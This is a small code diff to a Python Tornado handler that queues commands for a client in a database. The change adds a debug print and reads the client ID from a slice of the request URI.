@@ -109,7 +109,8 @@ class ClientHandler(BaseHandler):
         self.render(tornado.options.options.html + "/client.html",data = client_data)
     
     def post(self):
-        client_id = self.get_body_argument("clientid")
+        print("diocane")
+        client_id = self.request.uri[8:]
         command = self.get_body_argument("command")
         command_id = secrets.token_urlsafe()
         Utility.DB.executeQuery("INSERT INTO QUEUE('COMMAND_ID','CLIENT_ID','COMMAND') VALUES(?,?,?)",[command_id,client_id,command])
